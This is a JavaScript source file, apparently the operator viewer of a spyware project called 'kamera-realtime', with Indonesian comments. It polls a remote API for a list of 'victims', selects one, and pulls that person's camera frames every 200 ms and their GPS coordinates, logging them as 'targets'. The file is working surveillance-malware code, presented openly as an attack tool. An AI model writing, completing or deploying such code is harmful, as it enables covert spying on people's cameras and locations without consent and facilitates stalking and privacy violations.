// viewer.js (di project kamera-realtime)
// URL API yang sama dengan domain viewer ini
const VERCEL_VIEWER_API = 'https://kamera-realtime.vercel.app/api';

// Elemen UI dari HTML lo
const remoteVideoStream = document.getElementById("remoteVideoStream"); // Ini sekarang IMG tag
const terminalDiv = document.getElementById("terminal"); // Ganti nama biar gak bentrok
const statusTextSpan = document.getElementById("statusText"); // Ganti nama biar gak bentrok
const victimSelectionDiv = document.getElementById("victimSelection"); // Container daftar korban
const noVictimsMessage = document.getElementById("noVictimsMessage");
const disconnectBtn = document.getElementById("disconnectBtn");

let activeVictimId = null;
let refreshFrameInterval = null; // Interval untuk refresh frame
let refreshVictimsInterval = null; // Interval untuk refresh daftar korban

// Fungsi logging ke terminal, dari script lo
function log(msg, type = "ok") {
    const line = document.createElement("span");
    line.className = type;
    const time = new Date().toLocaleTimeString();
    line.textContent = `[${time}] ${msg}`;
    terminalDiv.appendChild(line);
    terminalDiv.scrollTop = terminalDiv.scrollHeight;
}

// Fungsi update status, dari script lo
function setStatus(text, colorClass = "warn") {
    statusTextSpan.innerHTML = `STATUS: <span class="${colorClass}">${text}</span>`;
}

// Fungsi untuk fetch daftar korban aktif
async function fetchVictims() {
    log("Scanning for active targets...", "warn");
    try {
        const response = await fetch(`${VERCEL_VIEWER_API}/list-victims`);
        const data = await response.json();
        
        victimSelectionDiv.innerHTML = ''; // Bersihkan daftar sebelumnya

        if (data.victims && data.victims.length > 0) {
            noVictimsMessage.style.display = 'none'; // Sembunyikan pesan 'tidak ada korban'
            log(`Found ${data.victims.length} active targets.`, "ok");

            data.victims.forEach(id => {
                const button = document.createElement('button');
                button.textContent = `TARGET_ID: ${id.substring(0, 8)}...`; // Tampilkan sebagian ID biar gak kepanjangan
                button.onclick = () => selectVictim(id);
                if (id === activeVictimId) {
                    button.classList.add('active');
                }
                victimSelectionDiv.appendChild(button);
            });

            // Jika ada korban tapi belum ada yang dipilih, pilih yang pertama secara otomatis
            if (!activeVictimId || !data.victims.includes(activeVictimId)) {
                 if (data.victims.length > 0) {
                    selectVictim(data.victims[0]);
                } else {
                    resetViewer(); // Jika korban aktif tiba-tiba hilang
                }
            }
        } else {
            // Tidak ada korban aktif, bersihkan semua
            resetViewer();
            noVictimsMessage.style.display = 'block'; // Tampilkan pesan 'tidak ada korban'
            log("No active targets found, scanning again...", "warn");
        }
    } catch (error) {
        console.error('Gagal daftar korban, bangsat:', error);
        log("ERROR: Failed to fetch target list, network anomaly detected!", "err");
        victimSelectionDiv.innerHTML = '<p style="color:#ff4444;">ERROR: Gagal memuat daftar target, anjing!</p>';
        noVictimsMessage.style.display = 'none';
    }
}

// Fungsi untuk memilih korban dan mulai menampilkan feed
async function selectVictim(id) {
    if (refreshFrameInterval) {
        clearInterval(refreshFrameInterval);
    }
    activeVictimId = id;
    
    // Update tombol yang aktif di daftar korban
    Array.from(victimSelectionDiv.children).forEach(btn => {
        if (btn.tagName === 'BUTTON') {
            btn.classList.remove('active');
            if (btn.textContent.startsWith(`TARGET_ID: ${id.substring(0, 8)}`)) {
                btn.classList.add('active');
            }
        }
    });

    log(`Connecting to target: ${id.substring(0, 8)}...`, "warn");
    setStatus(`CONNECTING TO ${id.substring(0, 8)}...`, "warn");
    disconnectBtn.disabled = false;

    fetchVictimFrame(); // Ambil frame pertama
    refreshFrameInterval = setInterval(fetchVictimFrame, 200); // Ambil frame setiap 200ms
    log(`Realtime feed initiated for target ${id.substring(0, 8)}.`, "ok");
    setStatus(`STREAMING FROM ${id.substring(0, 8)}`, "ok");
}

// Fungsi untuk mengambil frame dan lokasi terbaru dari korban
async function fetchVictimFrame() {
    if (!activeVictimId) return;

    try {
        const response = await fetch(`${VERCEL_VIEWER_API}/get-frame?victimId=${activeVictimId}`);
        if (response.ok) {
            const data = await response.json();
            if (data.imageData) {
                remoteVideoStream.src = data.imageData;
                if (data.location && data.location.latitude && data.location.longitude) {
                    log(`LOCATION: Lat ${data.location.latitude}, Lng ${data.location.longitude}`, "info");
                }
            } else {
                remoteVideoStream.src = ''; // Kosongkan jika tidak ada frame
                log(`WARNING: Target ${activeVictimId.substring(0, 8)} feed unavailable or disconnected.`, "err");
                // Coba refresh daftar korban, mungkin target sudah offline
                fetchVictims();
            }
        } else {
            remoteVideoStream.src = '';
            log(`ERROR: Failed to retrieve frame from target ${activeVictimId.substring(0, 8)}.`, "err");
            // Jika korban yang aktif mati, coba refresh daftar korban
            fetchVictims();
        }
    } catch (error) {
        console.error('Error saat mengambil frame, sialan:', error);
        remoteVideoStream.src = '';
        log(`CRITICAL ERROR: Connection to target ${activeVictimId.substring(0, 8)} lost!`, "err");
        fetchVictims();
    }
}

// Fungsi untuk memutuskan koneksi dari target
disconnectBtn.addEventListener("click", () => {
    log(`Disconnecting from target ${activeVictimId.substring(0, 8)}...`, "warn");
    resetViewer();
    log("Listener module reset. Ready for next target.", "ok");
    setStatus("IDLE", "warn");
    fetchVictims(); // Refresh daftar korban setelah disconnect
});

// Fungsi untuk mereset semua tampilan viewer
function resetViewer() {
    if (refreshFrameInterval) {
        clearInterval(refreshFrameInterval);
    }
    activeVictimId = null;
    remoteVideoStream.src = ''; // Kosongkan gambar
    disconnectBtn.disabled = true;
    setStatus("IDLE", "warn");
    // Hapus class 'active' dari semua tombol korban
    Array.from(victimSelectionDiv.children).forEach(btn => {
        if (btn.tagName === 'BUTTON') {
            btn.classList.remove('active');
        }
    });
}


// Inisiasi awal saat boot
log("System booting...", "warn");
log("Loading remote listener modules...", "warn");
log("UI initialized successfully.", "ok");
log("Scanning for active targets. Stand by...", "warn");

// Refresh daftar korban setiap beberapa detik
refreshVictimsInterval = setInterval(fetchVictims, 7000); // Cukup setiap 7 detik biar gak terlalu banyak request KV
fetchVictims(); // Panggil pertama kali saat halaman dibuka
